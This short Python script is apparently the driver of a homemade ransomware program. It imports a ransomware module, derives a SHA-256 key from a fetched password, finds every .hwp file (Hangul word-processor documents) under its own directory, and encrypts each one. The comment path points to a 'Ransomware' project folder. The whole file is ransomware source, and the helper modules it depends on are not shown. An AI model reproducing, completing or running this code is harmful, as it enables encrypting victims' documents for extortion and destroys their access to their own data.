import hashlib,Search
from RansomModule import *
from Get_data import *

password = bytes(get_key(),encoding="utf-8")
key = hashlib.sha256(password).digest()
default_path = os.path.dirname(os.path.realpath(__file__))
#default_path = "C:\\Users\\oonja\\Desktop\\Ransomware"

ext_list = [".hwp"]
file,directory = Search.search(default_path,ext_list)

for i in file:
    encrypt_file(key,i)

print("Encrypted Finish!")
